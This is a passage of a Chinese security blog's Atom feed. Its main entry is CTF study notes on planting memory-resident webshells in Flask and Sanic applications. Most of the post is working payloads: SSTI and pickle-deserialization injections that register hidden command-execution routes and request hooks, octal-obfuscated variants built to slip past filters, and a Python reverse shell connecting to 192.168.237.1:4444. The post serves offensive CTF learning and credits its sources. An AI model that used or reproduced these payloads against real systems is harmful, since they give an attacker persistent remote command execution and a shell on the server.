    <summary type="html">&lt;h3 id=&quot;DASCTF-2024最后一战｜寒夜破晓，冬至终章&quot;&gt;DASCTF 2024最后一战｜寒夜破晓，冬至终章]&lt;/h3&gt;
&lt;h4 id=&quot;const-python&quot;&gt;const_python&lt;/h4&gt;
&lt;p&gt;题目描述：自认为搭建了一个完美的web应用，不会有问题，很自</summary>
      
    
    
    
    <category term="CTF" scheme="https://oceanzbz.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://oceanzbz.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>内存马</title>
    <link href="https://oceanzbz.github.io/post/698e8213.html"/>
    <id>https://oceanzbz.github.io/post/698e8213.html</id>
    <published>2025-02-24T11:05:16.000Z</published>
    <updated>2025-03-05T07:24:36.801Z</updated>
    
    <content type="html"><![CDATA[<p>打ctf的时候遇到很多flask打ssti，遇到没有回显时，往往除了覆盖加盲注就不知道怎么弄了，今天来学习下其他师傅发现的内存马。记录一下当作笔记。</p><h2 id="低版本内存马">低版本内存马</h2><p>在flask中，没有定义的路由会返回404的，因此内存马最初是通过动态注册路由来实现的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;x.__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;exec&#x27;</span>)(<span class="string">&quot;setattr(__import__(&#x27;sys&#x27;).modules.__getitem__(&#x27;__main__&#x27;).__dict__.__getitem__(&#x27;app&#x27;),&#x27;_got_first_request&#x27;,False);__import__(&#x27;sys&#x27;).modules.__getitem__(&#x27;__main__&#x27;).__dict__.__getitem__(&#x27;app&#x27;).add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda: &#x27;&lt;pre&gt;&#123;0&#125;&lt;/pre&gt;&#x27;.format(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()))&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="新版本内存马">新版本内存马</h2><h3 id="add-url-rule-绕过">add_url_rule 绕过</h3><p>首先构造第一条请求向 <code>url_map</code> 中新增一条 <code>UrlRule</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>]( <span class="string">&quot;app.url_map.add( app.url_rule_class(&#x27;/shell&#x27;, methods=[&#x27;GET&#x27;], endpoint=&#x27;shell&#x27;) )&quot;</span>, &#123; <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>] &#125; )</span><br></pre></td></tr></table></figure><p>此时访问 /shell 不会报 404 了，也就是说我们成功将 “/shell” 添加到了路由表，但是由于并未添加 <code>view_function[endpoint]</code>，会报 KeyError 错误,然后构造第二条请求向 <code>view_function</code> 中添加对应 <code>endpoint</code> 的实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>]( <span class="string">&quot;app.view_functions.update( &#123; &#x27;shell&#x27;: lambda:__import__(&#x27;os&#x27;).popen( app.request_context.__globals__[&#x27;request_ctx&#x27;].request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;) ).read() &#125; )&quot;</span>, &#123; <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>] &#125; )</span><br></pre></td></tr></table></figure><h3 id="before-request">before_request</h3><p>先来看一下这个装饰器的实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>(<span class="params">self, f: BeforeRequestCallable</span>) -&gt; BeforeRequestCallable:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    在每次请求之前，调用自定义的函数f</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="variable language_">self</span>.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里，如果 None 键不存在，就初始化为一个空列表。如果存在传入的函数 f，则通过调用<code>before_request_funcs.setdefault(None, []).append(f)</code>函数把自定义函数f添加到before_request_funcs 字典中，在每次请求处理之前调用这个函，所以如果我们如果注入进去一个函数，就会在每次请求的时候就会调用我们注入的函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda: &#x27;&lt;pre&gt;&#123;0&#125;&lt;/pre&gt;&#x27;.format(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="after-request">after_request</h3><p><code>after_request</code>装饰器在每次请求处理之后调用，同样可以接收一个自定义函数f，区别在，这里的函数需要接收一个response对象，同时返回一个response对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">after_request</span>(<span class="params">self, f: AfterRequestCallable</span>) -&gt; AfterRequestCallable:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;注册一个函数，在每次请求后运行。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        该函数会接收响应对象，并必须返回一个响应对象。这允许函数在发送响应之前修改或替换响应。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        如果一个函数引发异常，则任何剩余的 ``after_request`` 函数将不会被调用。因此，这不应用于必须执行的操作，例如关闭资源。请使用 :meth:`teardown_request` 来处理此类操作。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>和before_request很像，不过lambda无法对原始传进来的response进行修改后再返回，所以需要重新生成一个response对象，然后再返回这个response。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> resp: <span class="comment">#传入参数</span></span><br><span class="line">    CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span>      <span class="comment">#如果请求参数含有cmd则返回命令执行结果</span></span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        global CmdResp;     #定义一个全局变量，方便获取</span></span><br><span class="line"><span class="string">        CmdResp=make_response(os.popen(request.args.get(\&#x27;cmd\&#x27;)).read())   #创建一个响应对象</span></span><br><span class="line"><span class="string">    &#x27;</span>)==<span class="literal">None</span>    <span class="comment">#exec函数返回None，所以恒真</span></span><br><span class="line">    <span class="keyword">else</span> resp)  <span class="comment">#如果请求参数没有cmd则正常返回</span></span><br><span class="line"><span class="comment">#这里的cmd参数名和CmdResp变量名都是可以改的，最好改成服务中不存在的变量名以免影响正常业务</span></span><br></pre></td></tr></table></figure><p>ssti</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;&amp;cmd=whoami</span><br></pre></td></tr></table></figure><h3 id="endpoint">endpoint</h3><p>在 Flask 中，<strong><code>endpoint</code></strong> 是路由系统中的一个非常重要的概念，它代表了每个注册的 URL 路由的名称或标识符。<code>endpoint</code> 通过 Flask 的路由系统将 URL 和视图函数关联起来，可以用来构建 URL 或在应用程序的某些部分引用特定的视图函数。Flask 在为视图函数注册 URL 路由时，会自动将视图函数的名字作为该路由的 <code>endpoint</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](  </span><br><span class="line"><span class="string">&quot;  </span></span><br><span class="line"><span class="string">app.backup_func=app.view_functions[&#x27;hello_endpoint&#x27;];  </span></span><br><span class="line"><span class="string">app.view_functions[&#x27;hello_endpoint&#x27;]=lambda : __import__(&#x27;os&#x27;).popen(reques  </span></span><br><span class="line"><span class="string">t.args.get(&#x27;cmd&#x27;)).read() if &#x27;cmd&#x27; in request.args.keys() is not None else  </span></span><br><span class="line"><span class="string">app.backup_func()  </span></span><br><span class="line"><span class="string">&quot;</span>,  </span><br><span class="line">&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>], <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;curre  </span></span><br><span class="line"><span class="string">nt_app&#x27;</span>]&#125;) &#125;&#125;  </span><br><span class="line">app.view_functions[<span class="string">&#x27;hello_endpoint&#x27;</span>]=<span class="keyword">lambda</span> : <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(reques  </span><br><span class="line">t.args.get(request.args.get(<span class="string">&#x27;cmd&#x27;</span>))).read()</span><br></pre></td></tr></table></figure><h3 id="errorhandler">errorhandler</h3><p>这个函数可以用于自定义404页面的回显</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="teardown-request">teardown_request</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">teardown_request</span>(<span class="params">self, f: TeardownCallable</span>) -&gt; TeardownCallable:</span><br><span class="line">        <span class="variable language_">self</span>.teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>teardown_request</code>装饰器在每次请求处理之后调用，同样可以接收一个自定义函数f，在后台运行，没有回显，可以写文件，出网反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>)&#125;&#125;&amp;cmd=echo <span class="number">11111</span> &gt; <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><h3 id="teardown-appcontext">teardown_appcontext</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">teardown_appcontext</span>(<span class="params">self, f: TeardownCallable</span>) -&gt; TeardownCallable:</span><br><span class="line">        <span class="variable language_">self</span>.teardown_appcontext_funcs.append(f)</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不能接收get动态传参，可以写文件，出网反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_appcontext_funcs.append(lambda error: __import__(&#x27;os&#x27;).popen(&#x27;echo 2222 &gt; 1.txt&#x27;).read())&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="url-value-preprocessor">url_value_preprocessor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](  </span><br><span class="line"><span class="string">&quot;  </span></span><br><span class="line"><span class="string">app.url_value_preprocessors[None].append(lambda ep, args : __import__(&#x27;os&#x27;)  </span></span><br><span class="line"><span class="string">.popen(request.args.get(&#x27;cmd&#x27;)) if &#x27;cmd&#x27; in request.args.keys() else None)  </span></span><br><span class="line"><span class="string">&quot;</span>,  </span><br><span class="line">&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>], <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;curre  </span></span><br><span class="line"><span class="string">nt_app&#x27;</span>]&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="context-processor">context_processor</h3><p>先用下面的 payload 将 <code>os.popen(...).read()</code> 的返回值赋给 <code>cmd</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>]( <span class="string">&quot;app.template_context_processors[None].append( lambda : &#123; &#x27;cmd&#x27;: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read() &#125; )&quot;</span>, &#123; <span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>], <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>] &#125; )<span class="comment">## context_processor</span></span><br></pre></td></tr></table></figure><p>之后用 ssti <code>&#123;&#123;cmd&#125;&#125;</code> 就能获取命令回显</p><h2 id="sanic框架内存马">sanic框架内存马</h2><h3 id="add-route">add_route</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.add_route(<span class="keyword">lambda</span> request: <span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(request.args.get(<span class="string">&quot;cmd&quot;</span>)).read(),<span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br></pre></td></tr></table></figure><h3 id="exception">exception</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.exception(Exception)(<span class="keyword">lambda</span> request, exception: <span class="built_in">__import__</span>(<span class="string">&quot;sanic&quot;</span>).response.text(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(request.args.get(<span class="string">&quot;cmd&quot;</span>)).read()))</span><br></pre></td></tr></table></figure><h2 id="抄来的姿势">抄来的姿势</h2><h3 id="无字母内存马">无字母内存马</h3><ul><li>flask可以使用<code>['']</code>替换<code>.</code>，来访问对象属性，例如：<code>''.__class__</code>,<code>''['__class__']</code></li><li>flask可以解析引号里的进制，例如十六进制，八进制，十进制</li><li>flask可以使用<code>__import__</code>来导入模块，例如：<code>__import__('os')</code></li></ul><p>原payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda: __import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;a&#x27;)).read())&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>无字母payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\137\137\143\154\141\163\163\137\137&#x27;</span>][<span class="string">&#x27;\137\137\142\141\163\145\137\137&#x27;</span>][<span class="string">&#x27;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;\137\137\151\156\151\164\137\137&#x27;</span>][<span class="string">&#x27;\137\137\147\154\157\142\141\154\163\137\137&#x27;</span>][<span class="string">&#x27;\137\137\142\165\151\154\164\151\156\163\137\137&#x27;</span>][<span class="string">&#x27;\145\170\145\143&#x27;</span>](<span class="string">&quot;\163\171\163.\155\157\144\165\154\145\163[&#x27;\137\137\155\141\151\156\137\137&#x27;].\137\137\144\151\143\164\137\137[&#x27;\141\160\160&#x27;].\142\145\146\157\162\145\137\162\145\161\165\145\163\164\137\146\165\156\143\163.\163\145\164\144\145\146\141\165\154\164(\116\157\156\145, []).\141\160\160\145\156\144(\154\141\155\142\144\141: \137\137\151\155\160\157\162\164\137\137(&#x27;\157\163&#x27;).\160\157\160\145\156(\137\137\151\155\160\157\162\164\137\137(&#x27;\146\154\141\163\153&#x27;).\162\145\161\165\145\163\164.\141\162\147\163.\147\145\164(&#x27;\141&#x27;)).\162\145\141\144())&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="无字母弹shell">无字母弹shell</h3><p>原payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;python3 -c \&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;192.168.237.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)\&#x27;&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>无字母payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\137\137\143\154\141\163\163\137\137&#x27;</span>][<span class="string">&#x27;\137\137\142\141\163\145\137\137&#x27;</span>][<span class="string">&#x27;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;\137\137\151\156\151\164\137\137&#x27;</span>][<span class="string">&#x27;\137\137\147\154\157\142\141\154\163\137\137&#x27;</span>][<span class="string">&#x27;\160\157\160\145\156&#x27;</span>](<span class="string">&#x27;\160\171\164\150\157\1563 -\143 \&#x27;\151\155\160\157\162\164 \157\163,\160\164\171,\163\157\143\153\145\164;\163=\163\157\143\153\145\164.\163\157\143\153\145\164();\163.\143\157\156\156\145\143\164((&quot;192.168.237.1&quot;,4444));[\157\163.\144\165\1602(\163.\146\151\154\145\156\157(),\146)\146\157\162 \146 \151\156(0,1,2)];\160\164\171.\163\160\141\167\156(&quot;\163\150&quot;)\&#x27;&#x27;</span>)[<span class="string">&#x27;\162\145\141\144&#x27;</span>]()</span><br></pre></td></tr></table></figure><h3 id="通过-Undefined-拿-globals">通过 Undefined 拿 globals</h3><p>ssti 用一个模板上下文不存在的变量作起点时，例如 <code>&#123;&#123;aaa.__init__&#125;&#125;</code>，可以拿到一个 <code>&lt;bound method Undefined.__init__ of Undefined&gt;</code>然后可以获取到globals<code>&#123;&#123;aaa.__init__.__globals__&#125;&#125;</code></p><h3 id="获取-flask-request-对象">获取 flask.request 对象</h3><p>flask&lt;2.3.0 时，可以用 <code>url_for.__globals__.get('_request_ctx_stack')</code> 拿到堆栈</p><p>flask&gt;=2.3.0 时，可以用 <code>url_for.__globals__['current_app'].request_context.__globals__['request_ctx']</code> 拿到堆栈</p><p>上面这两种拿法都是获取 <strong>RequestContext</strong> 对象，然后用 <code>RequestContext.request</code> 的方式来获取 request<br>可以直接用 <code>url_for.__globals__['request']</code>来获取request对象</p><h3 id="pickle反序列化打内存马">pickle反序列化打内存马</h3><h4 id="before-request-2">before_request</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h4 id="after-request-2">after_request</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;gxngxngxn&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;gxngxngxn\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h4 id="errorhandler-2">errorhandler</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><p>以上payload来自以下文章：</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a><br><a href="https://the0n3.top/pages/77dbc1/">https://the0n3.top/pages/77dbc1/</a><br><a href="https://asal1n.github.io/2024/10/18/python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;&amp;%E5%86%85%E5%AD%98%E9%A9%AC/">https://asal1n.github.io/2024/10/18/python命令执行&amp;&amp;内存马/</a><br><a href="https://www.caterpie771.cn/2024/09/27/flask-%E5%86%85%E5%AD%98%E9%A9%AC/">https://www.caterpie771.cn/2024/09/27/flask-内存马/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打ctf的时候遇到很多flask打ssti，遇到没有回显时，往往除了覆盖加盲注就不知道怎么弄了，今天来学习下其他师傅发现的内存马。记录一下当作笔记。&lt;/p&gt;
&lt;h2 id=&quot;低版本内存马&quot;&gt;低版本内存马&lt;/h2&gt;
&lt;p&gt;在flask中，没有定义的路由会返回404的，因此内存</summary>
      
    
    
    
    <category term=" CTF" scheme="https://oceanzbz.github.io/categories/CTF/"/>
    
    
    <category term="Python安全" scheme="https://oceanzbz.github.io/tags/Python%E5%AE%89%E5%85%A8/"/>
    
    <category term="内存马" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="CTF" scheme="https://oceanzbz.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Initial-春秋云镜</title>
    <link href="https://oceanzbz.github.io/post/6b005d5.html"/>
    <id>https://oceanzbz.github.io/post/6b005d5.html</id>
    <published>2025-02-17T14:52:16.000Z</published>
    <updated>2025-03-06T04:23:04.785Z</updated>
    
